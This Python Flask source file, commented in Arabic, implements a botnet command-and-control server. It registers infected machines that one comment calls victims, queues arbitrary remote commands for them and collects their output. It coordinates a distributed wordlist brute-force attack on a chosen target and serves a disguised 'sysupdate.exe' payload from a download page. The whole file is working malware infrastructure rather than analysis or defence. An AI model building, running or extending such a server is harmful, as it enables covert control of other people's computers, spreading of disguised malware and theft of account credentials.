from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_file
from datetime import datetime, timedelta
import functools
import hashlib
import os
import re
import json
import zipfile
import io
import base64

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ===== بيانات الدخول =====
USERNAME = "admin"
PASSWORD_HASH = hashlib.sha256("SecurePass123".encode()).hexdigest()

# ===== نظام القفل =====
failed_attempts = {}

def get_remaining_lockout(ip):
    record = failed_attempts.get(ip)
    if not record:
        return 0
    locked_until = record.get("locked_until")
    if locked_until and datetime.now() < locked_until:
        return (locked_until - datetime.now()).total_seconds()
    return 0

def compute_lock_duration(attempts):
    if attempts < 5:
        return 0
    factor = (attempts - 5) // 4 + 1
    return factor * 3600

def login_required(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# ===== الصفحات العامة =====
@app.route('/')
def home():
    if 'logged_in' in session and session['logged_in']:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.remote_addr

        remaining = get_remaining_lockout(ip)
        if remaining > 0:
            return jsonify({"error": f"Locked. Wait {int(remaining//60)} min"}), 403

        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
            return jsonify({"error": "Invalid username"}), 400

        password_hash = hashlib.sha256(password.encode()).hexdigest()
        if username == USERNAME and password_hash == PASSWORD_HASH:
            failed_attempts.pop(ip, None)
            session['logged_in'] = True
            session['username'] = username
            if request.headers.get('X-Requested-With') == 'CLI':
                return jsonify({"status": "ok", "message": "Authenticated"})
            return redirect(url_for('dashboard'))
        else:
            record = failed_attempts.get(ip, {"attempts": 0, "locked_until": None})
            record["attempts"] += 1
            attempts = record["attempts"]
            lock_duration = compute_lock_duration(attempts)
            if lock_duration > 0:
                record["locked_until"] = datetime.now() + timedelta(seconds=lock_duration)
            failed_attempts[ip] = record
            remaining = get_remaining_lockout(ip)
            msg = f"Invalid. Attempts left: {max(0, 5 - (attempts % 5))}"
            if remaining > 0:
                msg = f"Locked. Wait {int(remaining//60)} min"
            return jsonify({"error": msg}), 401

    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ===== مسار التحميل العام =====
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route('/payload')
def download_payload():
    try:
        possible_files = ['sysupdate.exe', 'sysupdate']
        payload_dir = os.path.join(BASE_DIR, 'payloads')
        for filename in possible_files:
            file_path = os.path.join(payload_dir, filename)
            if os.path.exists(file_path):
                return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
        return "File not found", 404
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/download')
def download_page():
    return '''
    <html>
    <head><title>Download</title></head>
    <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
        <h1>Download Agent</h1>
        <a href="/payload" style="color:#0f0;border:1px solid #0f0;padding:10px 20px;text-decoration:none;">Download sysupdate.exe</a>
    </body>
    </html>
    '''

# ===== الصفحات المحمية =====
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('index.html')

@app.route('/room/<bot_id>')
@login_required
def bot_room(bot_id):
    if bot_id not in bots:
        return "Bot not found", 404
    return render_template('room.html', bot_id=bot_id, bot_info=bots[bot_id])

# ===== البيانات الأساسية =====
bots = {}        # bot_id -> {ip, os, last_seen, cwd}
tasks = {}       # bot_id -> [list of commands] (each command is a dict or string)
results = {}     # bot_id -> output
task_results = {} # task_id -> result (for CLI polling)

# ===== عداد الأرقام (0001 - 9999) =====
bot_id_counter = 1

def get_next_bot_id():
    global bot_id_counter
    if bot_id_counter > 9999:
        bot_id_counter = 1
    bid = f"{bot_id_counter:04d}"
    bot_id_counter += 1
    return bid

# ===== 🔥 نظام Brute Force =====
bruteforce_data = {
    "active": False,
    "target": "",
    "queue": [],
    "total": 0,
    "processed": 0,
    "success": 0,
    "failed": 0,
    "results": [],
    "assigned_tasks": {},
    "stop_requested": False
}

# ===== APIs للـ CLI =====

# 1. تسجيل الدخول للـ CLI
@app.route('/api/cli/login', methods=['POST'])
def cli_login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    if username == USERNAME and hashlib.sha256(password.encode()).hexdigest() == PASSWORD_HASH:
        session['logged_in'] = True
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "message": "Invalid credentials"}), 401

# 2. جلب لائحة الضحايا
@app.route('/api/cli/bots', methods=['GET'])
@login_required
def cli_bots():
    now = datetime.now()
    active_list = []
    for bot_id, info in bots.items():
        is_online = (now - info['last_seen']).total_seconds() < 30
        active_list.append({
            "id": bot_id,
            "ip": info['ip'],
            "os": info['os'],
            "online": is_online,
            "last_seen": info['last_seen'].strftime("%H:%M:%S")
        })
    return jsonify(active_list)

# 3. إرسال أمر لضحية معينة
@app.route('/api/cli/command', methods=['POST'])
@login_required
def cli_command():
    data = request.json
    bot_id = data.get('bot_id')
    cmd = data.get('cmd')
    args = data.get('args', {})

    if not bot_id or not cmd:
        return jsonify({"status": "error", "message": "bot_id and cmd required"}), 400

    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not found"}), 404

    # نضع الأمر في الطابور
    task_id = hashlib.md5(f"{bot_id}{cmd}{datetime.now()}".encode()).hexdigest()[:8]
    command_payload = {
        "task_id": task_id,
        "cmd": cmd,
        "args": args
    }
    if bot_id not in tasks:
        tasks[bot_id] = []
    tasks[bot_id].append(command_payload)

    # نخزن معرف المهمة باش نجيب النتيجة
    task_results[task_id] = None

    return jsonify({"status": "queued", "task_id": task_id})

# 4. جلب نتيجة أمر
@app.route('/api/cli/result/<task_id>', methods=['GET'])
@login_required
def cli_result(task_id):
    if task_id in task_results:
        result = task_results.pop(task_id)
        return jsonify({"status": "done", "result": result})
    return jsonify({"status": "pending"})

# 5. بدء Brute Force
@app.route('/api/cli/bruteforce/start', methods=['POST'])
@login_required
def cli_bruteforce_start():
    data = request.json
    target = data.get('target', '').strip()
    wordlist = data.get('wordlist', '').strip()

    if not target or not wordlist:
        return jsonify({"status": "error", "message": "Target and wordlist required"}), 400

    passwords = [p.strip() for p in wordlist.split('\n') if p.strip()]
    if not passwords:
        return jsonify({"status": "error", "message": "Wordlist empty"}), 400

    global bruteforce_data
    bruteforce_data = {
        "active": True,
        "target": target,
        "queue": passwords.copy(),
        "total": len(passwords),
        "processed": 0,
        "success": 0,
        "failed": 0,
        "results": [],
        "assigned_tasks": {},
        "stop_requested": False
    }

    return jsonify({"status": "started", "total": len(passwords)})

# ===== باقي APIs =====
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        # نعطي ID جديد (4 أرقام)
        new_id = get_next_bot_id()
        bots[new_id] = {
            'ip': request.remote_addr,
            'os': data.get('os', 'Unknown'),
            'last_seen': datetime.now(),
            'cwd': 'C:\\'
        }
        if new_id not in tasks:
            tasks[new_id] = []
        return jsonify({"status": "ok", "assigned_id": new_id})
    return jsonify({"status": "error"}), 400

@app.route('/get_task', methods=['GET'])
def get_task():
    # نبحث عن أي bot ID (نستخدم المعرف المرسل من الـ Agent)
    # الـ Agent القديم كايستخدم socket.gethostname()...
    # ولكن الآن سيرسل الـ ID الجديد (4 أرقام) بعد التحديث.
    bot_id = request.args.get('id')
    if not bot_id:
        return jsonify({"command": ""})

    # نبحث في المهام
    if bot_id in tasks and len(tasks[bot_id]) > 0:
        cmd = tasks[bot_id].pop(0)
        return jsonify({"command": json.dumps(cmd)})

    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('id')
    output = data.get('output')
    new_cwd = data.get('cwd')

    if bot_id and bot_id in bots:
        bots[bot_id]['last_seen'] = datetime.now()
        if new_cwd:
            bots[bot_id]['cwd'] = new_cwd
        # نبحث عن task_id في النتيجة
        # نستخدم task_id لتحديث النتيجة
        try:
            result_data = json.loads(output)
            task_id = result_data.get('task_id')
            if task_id and task_id in task_results:
                task_results[task_id] = result_data.get('result', output)
        except:
            pass
        results[bot_id] = output
    return jsonify({"status": "ok"})

@app.route('/api/active_bots')
@login_required
def active_bots():
    now = datetime.now()
    active_list = []
    for bot_id, info in bots.items():
        if (now - info['last_seen']).total_seconds() < 30:
            active_list.append({
                "id": bot_id,
                "ip": info['ip'],
                "os": info['os'],
                "last_seen": info['last_seen'].strftime("%H:%M:%S"),
                "cwd": info.get('cwd', 'C:\\')
            })
    return jsonify(active_list)

@app.route('/api/send_command', methods=['POST'])
@login_required
def send_command():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    if bot_id and cmd:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        if bot_id not in tasks:
            tasks[bot_id] = []
        tasks[bot_id].append(cmd)
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 400

@app.route('/api/get_result', methods=['GET'])
@login_required
def get_result():
    bot_id = request.args.get('id')
    if bot_id and bot_id in results:
        out = results.pop(bot_id)
        return jsonify({"output": out})
    return jsonify({"output": ""})

# ===== Brute Force Report =====
@app.route('/bruteforce/report', methods=['POST'])
def bruteforce_report():
    data = request.json
    bot_id = data.get('bot_id')
    task_id = data.get('task_id')
    success = data.get('success', False)
    message = data.get('message', '')
    password = data.get('password', '')

    global bruteforce_data
    if not bruteforce_data["active"]:
        return jsonify({"status": "ignored"})

    result_entry = {
        "bot_id": bot_id,
        "password": password,
        "success": success,
        "message": message,
        "time": datetime.now().strftime("%H:%M:%S")
    }
    bruteforce_data["results"].append(result_entry)
    bruteforce_data["processed"] += 1

    if success:
        bruteforce_data["success"] += 1
        bruteforce_data["active"] = False
        bruteforce_data["stop_requested"] = True
    else:
        bruteforce_data["failed"] += 1

    return jsonify({"status": "received"})

@app.route('/bruteforce/status', methods=['GET'])
@login_required
def bruteforce_status():
    return jsonify({
        "active": bruteforce_data["active"],
        "target": bruteforce_data["target"],
        "total": bruteforce_data["total"],
        "processed": bruteforce_data["processed"],
        "success": bruteforce_data["success"],
        "failed": bruteforce_data["failed"],
        "queue_length": len(bruteforce_data["queue"]),
        "results": bruteforce_data["results"][-50:]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)